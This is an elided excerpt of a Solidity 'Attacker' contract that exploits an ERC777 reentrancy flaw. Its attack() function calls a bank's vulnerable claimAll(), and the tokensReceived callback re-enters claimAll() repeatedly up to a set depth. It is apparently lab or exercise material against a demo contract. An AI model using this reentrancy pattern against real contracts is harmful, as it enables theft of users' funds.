...
contract Attacker is AccessControl, IERC777Recipient {
    ...
    */
    function attack(uint256 amt) payable public {
        ...
        require(amt > 0, "Need positive ETH");
        ...
        // Step 2: trigger the vulnerable claimAll() function
        bank.claimAll();
    }
    ...
    */
    function tokensReceived(
        ...
        // only recurse when receiving the bank's ERC777 token
        require(msg.sender == address(bank.token()), "Invalid token callback");

        // Reenter only a limited number of times to avoid infinite recursion / gas issues
        if (depth < max_depth) {
            depth += 1;
            emit Recurse(depth);
            bank.claimAll();
